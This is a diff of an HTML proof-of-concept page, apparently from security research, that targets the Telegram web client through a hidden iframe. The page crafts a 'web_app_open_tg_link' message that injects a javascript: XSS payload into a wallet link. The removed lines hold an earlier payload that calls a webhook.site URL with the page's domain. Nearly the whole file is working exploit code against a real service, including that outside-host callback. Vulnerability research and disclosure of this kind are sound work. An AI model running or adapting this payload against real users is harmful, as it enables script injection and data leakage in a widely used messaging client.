@@ -1,19 +1,13 @@
 <!DOCTYPE html>
 <html>
   <body>
-    <h1>Triggering XSS test…</h1>
+    <h1>Testing javascript: XSS Payload…</h1>
     <iframe id="tg_frame" src="https://web.telegram.org/a/" style="display:none;"></iframe>
     <script>
       const payload = JSON.stringify({
         eventType: 'web_app_open_tg_link',
         eventData: {
-          path_full: `/wallet/start?x=${encodeURIComponent(`
-            (function(){
-              fetch('https://webhook.site/92fb9b80-9c28-4b47-a05f-da60e5e72ca4?domain=' + document.domain, {
-                mode: 'no-cors'
-              });
-            })()
-          `)}`
+          path_full: "/wallet/start?x=javascript:alert('XSS by Suraj')"
         }
       });
 
